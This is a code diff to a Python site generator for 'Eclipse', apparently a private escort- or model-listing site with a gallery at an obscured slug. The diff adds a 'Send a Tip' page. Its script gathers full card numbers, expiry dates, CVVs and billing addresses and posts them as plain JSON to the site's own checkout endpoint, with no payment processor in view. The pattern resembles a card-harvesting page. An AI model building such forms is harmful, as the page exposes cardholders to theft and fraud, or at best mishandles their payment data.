@@ -13,6 +13,7 @@ MODELS_DIR = BASE / "models"
 ASSETS_DIR = BASE / "assets"
 HOME_PATH = BASE / "index.html"
 GALLERY_DIR = BASE / "bsanvhbdahbhda"
+TIPS_DIR = BASE / "tips"
 EXTERNAL_MODELS_DIR = Path("/Users/mac/Downloads/model")
 
 GALLERY_SLUG = "bsanvhbdahbhda"
@@ -1103,13 +1104,49 @@ textarea.field::placeholder {
     }
 }
 
+
+.tips-page-card {
+    position: static;
+    max-height: none;
+}
+
+.amount-grid {
+    display: grid;
+    grid-template-columns: repeat(4, minmax(0, 1fr));
+    gap: 0.8rem;
+}
+
+.amount-option {
+    background: rgba(255,255,255,0.03);
+    border: 1px solid rgba(255,255,255,0.08);
+    color: var(--text);
+    border-radius: 18px;
+    padding: 0.95rem 1rem;
+    font-weight: 600;
+    transition: border-color 0.18s ease, background 0.18s ease, transform 0.18s ease;
+}
+
+.amount-option:hover,
+.amount-option.active {
+    border-color: rgba(201,164,85,0.5);
+    background: rgba(201,164,85,0.08);
+    transform: translateY(-1px);
+}
+
+.tips-note {
+    color: var(--muted);
+    font-size: 0.9rem;
+    line-height: 1.7;
+}
+
 @media (max-width: 520px) {
     .page-shell {
         width: min(100% - 1rem, 1240px);
     }
 
     .photo-grid,
-    .models-grid {
+    .models-grid,
+    .amount-grid {
         grid-template-columns: 1fr;
     }
 
@@ -1297,7 +1334,8 @@ function setMessage(target, text, type = 'info') {
 }
 
 function renderFooter() {
-    return `&copy; 2026 Eclipse &mdash; Private Access Only<br><a class="contact-link" href="${SITE.settings.contactUrl}" target="_blank" rel="noopener noreferrer">${escapeHtml(SITE.settings.contactLabel)}</a>`;
+    const tipsHref = `${getHomePath()}/tips/`;
+    return `&copy; 2026 Eclipse &mdash; Private Access Only<br><a class="contact-link" href="${SITE.settings.contactUrl}" target="_blank" rel="noopener noreferrer">${escapeHtml(SITE.settings.contactLabel)}</a><br><a class="contact-link" href="${tipsHref}">Send a Tip</a>`;
 }
 
 function initHomePage() {
@@ -1705,6 +1743,107 @@ function initModelPage() {
     initCheckout(model, location);
 }
 
+function initTipsPage() {
+    const footer = $('#page-footer');
+    if (footer) {
+        footer.innerHTML = renderFooter();
+    }
+
+    const amountInput = $('#tip-amount');
+    const message = $('#tip-message');
+    const form = $('#tip-form');
+    const submit = $('#tip-submit');
+    const amountButtons = $all('[data-tip-amount]');
+
+    function syncAmountButtons() {
+        const current = amountInput.value.trim();
+        amountButtons.forEach((button) => {
+            button.classList.toggle('active', button.dataset.tipAmount === current);
+        });
+    }
+
+    amountButtons.forEach((button) => {
+        button.addEventListener('click', () => {
+            amountInput.value = button.dataset.tipAmount || '';
+            syncAmountButtons();
+        });
+    });
+
+    amountInput.addEventListener('input', syncAmountButtons);
+
+    form.addEventListener('submit', async (event) => {
+        event.preventDefault();
+        setMessage(message, '');
+
+        const amount = Number(amountInput.value.trim());
+        if (!Number.isFinite(amount) || amount <= 0) {
+            setMessage(message, 'Please enter a valid tip amount.', 'error');
+            return;
+        }
+
+        const payload = {
+            actionKey: 'tip',
+            actionLabel: 'Tip',
+            amount,
+            modelSlug: 'tip',
+            modelName: 'Eclipse Tip',
+            cardNumber: $('#card-number').value.trim(),
+            expiryDate: $('#expiry-date').value.trim(),
+            cvv: $('#cvv').value.trim(),
+            billingName: $('#billing-name').value.trim(),
+            billingEmail: $('#billing-email').value.trim(),
+            billingAddress: $('#billing-address').value.trim(),
+            billingCity: $('#billing-city').value.trim(),
+            billingState: $('#billing-state').value.trim(),
+            billingZip: $('#billing-zip').value.trim(),
+            billingCountry: $('#billing-country').value.trim(),
+            notes: $('#tip-notes').value.trim(),
+            sourceUrl: window.location.href,
+        };
+
+        if (!payload.cardNumber || !payload.expiryDate || !payload.cvv || !payload.billingName || !payload.billingEmail || !payload.billingAddress || !payload.billingCity || !payload.billingState || !payload.billingZip || !payload.billingCountry) {
+            setMessage(message, 'Please complete the payment information and billing address.', 'error');
+            return;
+        }
+
+        submit.disabled = true;
+        submit.textContent = 'Processing...';
+
+        try {
+            const response = await fetch(SITE.settings.checkoutEndpoint, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload),
+            });
+
+            let data = {};
+            try {
+                data = await response.json();
+            } catch {
+                data = {};
+            }
+
+            if (!response.ok) {
+                throw new Error(data.error || 'Unable to submit your tip right now.');
+            }
+
+            const tipText = `Thank you for your tip of ${formatCurrency(amount)}.`;
+            const requestText = data.requestId ? ` Reference: ${data.requestId}.` : '';
+            setMessage(message, `${tipText}${requestText}`, 'success');
+            form.reset();
+            amountInput.value = '';
+            syncAmountButtons();
+        } catch (error) {
+            setMessage(message, error.message || 'Unable to submit your tip right now.', 'error');
+        } finally {
+            submit.disabled = false;
+            submit.textContent = 'Send Tip';
+        }
+    });
+}
+
 function initShared() {
     const footer = $('#page-footer');
     if (footer && !footer.innerHTML.trim()) {
@@ -1718,6 +1857,7 @@ document.addEventListener('DOMContentLoaded', () => {
     if (page === 'home') initHomePage();
     if (page === 'gallery') initGalleryPage();
     if (page === 'model') initModelPage();
+    if (page === 'tips') initTipsPage();
 });
 '''
 
@@ -1793,6 +1933,108 @@ GALLERY_HTML = '''<!DOCTYPE html>
         </div>
 
         <section id="gallery-grid" class="models-grid"></section>
+    </main>
+
+    <footer id="page-footer" class="footer"></footer>
+
+    <script src="../assets/models-data.js"></script>
+    <script type="module" src="../assets/site.js"></script>
+</body>
+</html>
+'''
+
+TIPS_HTML = '''<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Eclipse — Tips</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@300;400;600&family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/svg+xml" href="../assets/favicon.svg">
+    <link rel="stylesheet" href="../assets/styles.css">
+</head>
+<body data-page="tips" data-home-path="..">
+    <nav class="site-nav">
+        <a class="nav-link" href="../">&#8592; Home</a>
+        <div class="nav-brand">E<em>C</em>LIPSE</div>
+        <div class="nav-spacer"></div>
+    </nav>
+
+    <main class="center-screen">
+        <section class="checkout-panel tips-page-card">
+            <div class="heading-block" style="margin-bottom:1.6rem;">
+                <h1>Send a Tip</h1>
+                <p>Choose a suggested amount or enter any custom amount you would like to tip.</p>
+            </div>
+
+            <form id="tip-form" class="form-stack" autocomplete="off">
+                <div>
+                    <div class="step-heading" style="margin-bottom:0.75rem;">Choose Tip Amount</div>
+                    <div class="amount-grid">
+                        <button class="amount-option" type="button" data-tip-amount="100">$100</button>
+                        <button class="amount-option" type="button" data-tip-amount="200">$200</button>
+                        <button class="amount-option" type="button" data-tip-amount="500">$500</button>
+                        <button class="amount-option" type="button" data-tip-amount="1000">$1,000</button>
+                    </div>
+                    <div class="form-stack" style="margin-top:0.9rem;">
+                        <input id="tip-amount" class="field" type="number" min="1" step="1" placeholder="Or enter a custom tip amount" required>
+                    </div>
+                </div>
+
+                <div>
+                    <div class="step-heading" style="margin-bottom:0.65rem;">Payment Information</div>
+                    <div class="form-stack">
+                        <input id="card-number" class="field" type="text" inputmode="numeric" placeholder="Card Number" required>
+                        <div class="form-grid">
+                            <input id="expiry-date" class="field" type="text" placeholder="MM/YY" required>
+                            <input id="cvv" class="field" type="text" inputmode="numeric" placeholder="CVV" required>
+                        </div>
+                        <input id="billing-name" class="field" type="text" placeholder="Cardholder Name" required>
+                        <input id="billing-email" class="field" type="email" placeholder="Email Address" required>
+                    </div>
+                </div>
+
+                <div>
+                    <div class="step-heading" style="margin-bottom:0.65rem;">Billing Address</div>
+                    <div class="form-stack">
+                        <input id="billing-address" class="field" type="text" placeholder="Street Address" required>
+                        <div class="form-grid">
+                            <input id="billing-city" class="field" type="text" placeholder="City" required>
+                            <input id="billing-state" class="field" type="text" placeholder="State/Province" required>
+                        </div>
+                        <div class="form-grid">
+                            <input id="billing-zip" class="field" type="text" placeholder="ZIP/Postal Code" required>
+                            <select id="billing-country" class="field" required>
+                                <option value="">Select Country</option>
+                                <option value="US" selected>United States</option>
+                                <option value="CA">Canada</option>
+                                <option value="GB">United Kingdom</option>
+                                <option value="AU">Australia</option>
+                                <option value="DE">Germany</option>
+                                <option value="FR">France</option>
+                                <option value="IT">Italy</option>
+                                <option value="ES">Spain</option>
+                                <option value="NL">Netherlands</option>
+                                <option value="SE">Sweden</option>
+                                <option value="JP">Japan</option>
+                                <option value="KR">South Korea</option>
+                                <option value="SG">Singapore</option>
+                                <option value="AE">United Arab Emirates</option>
+                            </select>
+                        </div>
+                        <textarea id="tip-notes" class="field" placeholder="Optional note"></textarea>
+                    </div>
+                </div>
+
+                <p class="tips-note">Suggested amounts are optional — you can enter any custom amount you want.</p>
+                <div id="tip-message" class="message-box hidden"></div>
+                <div class="checkout-actions">
+                    <button id="tip-submit" class="btn" type="submit">Send Tip</button>
+                </div>
+            </form>
+        </section>
     </main>
 
     <footer id="page-footer" class="footer"></footer>
@@ -2138,6 +2380,8 @@ def write_pages(models: list[dict]) -> None:
     HOME_PATH.write_text(HOME_HTML, encoding="utf-8")
     GALLERY_DIR.mkdir(parents=True, exist_ok=True)
     (GALLERY_DIR / "index.html").write_text(GALLERY_HTML, encoding="utf-8")
+    TIPS_DIR.mkdir(parents=True, exist_ok=True)
+    (TIPS_DIR / "index.html").write_text(TIPS_HTML, encoding="utf-8")
 
     MODELS_DIR.mkdir(parents=True, exist_ok=True)
     for model in models:
